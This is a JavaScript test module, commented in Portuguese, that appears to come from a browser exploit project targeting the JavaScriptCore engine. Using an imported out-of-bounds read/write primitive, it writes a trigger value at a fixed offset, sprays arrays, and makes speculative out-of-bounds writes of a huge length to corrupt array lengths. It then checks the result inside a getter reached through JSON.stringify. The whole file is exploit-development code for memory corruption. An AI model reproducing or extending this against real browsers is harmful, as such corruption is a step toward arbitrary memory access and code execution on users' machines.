// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForArrayLengthCorruption";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const HUGE_ARRAY_LENGTH = 0x7FFFFFFE; 
const VICTIM_ARRAY_ORIGINAL_LENGTH = 16; // Definido como constante para clareza

// Variável para manter a referência ao array vítima que será verificado pelo getter.
// Será definida no runner e acessada no getter.
let array_victim_for_length_test_global_ref; 

class CheckpointForArrayLengthTest {
    constructor(id) {
        this.id_marker = `ArrayLengthTestCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "ArrayLengthCorruption_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = {
            success: false, message: "Getter chamado, verificando corrupção de length.",
            error: null, details: ""
        };
        let details_log = [];
        let internal_corruption_achieved = false;

        try {
            // Teste 1: Verificar o array_victim_for_length_test_global_ref (criado ANTES do trigger)
            if (array_victim_for_length_test_global_ref) {
                const victim1_current_length = array_victim_for_length_test_global_ref.length;
                details_log.push(`Array vítima (pré-criado) length: ${victim1_current_length} (Original: ${VICTIM_ARRAY_ORIGINAL_LENGTH})`);
                if (victim1_current_length !== VICTIM_ARRAY_ORIGINAL_LENGTH) {
                    logS3(`CORRUPÇÃO DE LENGTH (Array pré-criado)! Length: ${victim1_current_length}`, "vuln", FNAME_GETTER);
                    current_test_results.success = true; internal_corruption_achieved = true;
                    current_test_results.message = `Corrupção de length (Array pré-criado)! Length: ${victim1_current_length}.`;
                }
            } else {
                details_log.push("Array vítima (pré-criado) não encontrado no getter.");
            }

            // Teste 2: Criar arrays NOVOs no getter e tentar corromper seu length com escritas ESPECULATIVAS no oob_ab
            logS3("DENTRO DO GETTER (Teste 2): Spray de novos arrays e tentativa de corrupção de length via oob_ab...", "subtest", FNAME_GETTER);
            if (!oob_array_buffer_real || !oob_write_absolute) throw new Error("oob_ab ou oob_write_absolute não disponíveis");

            const spray_count_t2 = 50;
            const original_len_t2 = 8;
            let new_victim_arrays_t2 = [];
            for(let i=0; i<spray_count_t2; i++) new_victim_arrays_t2.push(new Array(original_len_t2).fill(i));
            details_log.push(`Spray de ${spray_count_t2} novos arrays (length ${original_len_t2}) feito no getter.`);

            // Onde no oob_array_buffer_real poderíamos escrever para afetar o length de um desses novos arrays?
            // Isto é altamente especulativo. Tentaremos alguns offsets.
            const speculative_offsets_for_length_write = [0x500, 0x508, 0x600, 0x608, 0x700, 0x708];
            for (const spec_offset of speculative_offsets_for_length_write) {
                if (spec_offset + 4 <= oob_array_buffer_real.byteLength) {
                    try {
                        oob_write_absolute(spec_offset, HUGE_ARRAY_LENGTH, 4); // Tenta escrever o length gigante
                        details_log.push(`Escrita especulativa de length em oob_ab[${toHex(spec_offset)}]`);
                    } catch (e_spec_write) { details_log.push(`Erro na escrita especulativa em ${toHex(spec_offset)}: ${e_spec_write.message}`);}
                }
            }
            
            // Verificar se algum dos new_victim_arrays_t2 teve seu length corrompido
            let new_array_corrupted = false;
            for(let i=0; i<new_victim_arrays_t2.length; i++) {
                if (new_victim_arrays_t2[i].length === HUGE_ARRAY_LENGTH) {
                    details_log.push(`SUCESSO T2! new_victim_arrays_t2[${i}].length é ${HUGE_ARRAY_LENGTH}!`);
                    logS3(details_log[details_log.length-1], "vuln", FNAME_GETTER);
                    current_test_results.success = true; internal_corruption_achieved = true;
                    current_test_results.message += ` Corrupção de length em novo array[${i}] para ${HUGE_ARRAY_LENGTH}!`;
                    new_array_corrupted = true;
                    break; 
                } else if (new_victim_arrays_t2[i].length !== original_len_t2 && i < 5) { // Log se diferente, mas não o gigante, para os primeiros
                    details_log.push(`new_victim_arrays_t2[${i}].length: ${new_victim_arrays_t2[i].length} (inesperado)`);
                }
            }
            if (new_array_corrupted) {
                logS3("CORRUPÇÃO DE LENGTH EM ARRAY NOVO NO GETTER DETECTADA!", "vuln", FNAME_GETTER);
            } else if (!current_test_results.success) { // Apenas se o teste do array pré-criado também não teve sucesso
                 details_log.push("Nenhuma corrupção de length detectada nos arrays novos do getter.");
            }


            if (!internal_corruption_achieved) { // Se nenhuma das tentativas acima funcionou
                current_test_results.message = "Nenhuma corrupção de length (nem em array pré-criado, nem em arrays novos no getter) foi detectada.";
            }

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        current_test_results.details = details_log.join('; ');
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForArrayLengthTest.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_array_length_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeArrayLengthCorruptionTestRunner";
    logS3(`--- Iniciando Teste de Corrupção de Length de Array (Pré e Intra-Getter) ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, details: "" };
    array_victim_for_length_test_global_ref = null; // Resetar a ref global

    if (!JSC_OFFSETS.ArrayBufferContents /* ...etc... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
             current_test_results.message = "OOB Init falhou.";
             logS3(current_test_results.message, "critical", FNAME_TEST_RUNNER);
             return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // 1. Criar o Array Vítima (que será acessado globalmente pelo getter) ANTES da escrita OOB gatilho
        array_victim_for_length_test_global_ref = new Array(VICTIM_ARRAY_ORIGINAL_LENGTH);
        for(let i=0; i< VICTIM_ARRAY_ORIGINAL_LENGTH; i++) array_victim_for_length_test_global_ref[i] = 0x41410000 + i;
        logS3(`Array vítima global criado com length ${array_victim_for_length_test_global_ref.length}. Conteúdo[0]=${toHex(array_victim_for_length_test_global_ref[0])}`, "info", FNAME_TEST_RUNNER);

        // 2. Escrita OOB Gatilho
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForArrayLengthTest(1);
        logS3(`CheckpointForArrayLengthTest objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { 
            logS3(`Erro em JSON.stringify (externo): ${e.message}`, "error", FNAME_TEST_RUNNER);
             if (!getter_called_flag) { current_test_results.message = `Erro JSON.stringify antes do getter: ${e.message}`; current_test_results.error = String(e);}
        }

    } catch (mainError) {
        logS3(`Erro principal no runner: ${mainError.message}`, "critical", FNAME_TEST_RUNNER);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico no runner: ${mainError.message}`, error: String(mainError), details: "" };
    } finally {
        logS3("Limpeza finalizada.", "info", "CleanupFinal"); // Este log é do finally do runner
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE ARRAY LENGTH CORRUPTION: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE ARRAY LENGTH CORRUPTION: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da inspeção do getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
         if (current_test_results.error) {
            logS3(`  Erro reportado no getter: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
        }
    } else {
        logS3("RESULTADO TESTE ARRAY LENGTH CORRUPTION: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
         if (current_test_results.error) { // Se houve erro antes do getter
            logS3(`  Erro (no runner): ${current_test_results.error} | Mensagem: ${current_test_results.message}`, "error", FNAME_TEST_RUNNER);
        }
    }

    clearOOBEnvironment();
    array_victim_for_length_test_global_ref = null; // Limpar ref global
    logS3(`--- Teste de Corrupção de Length de Array (Pré e Intra-Getter) Concluído ---`, "test", FNAME_TEST_RUNNER);
}
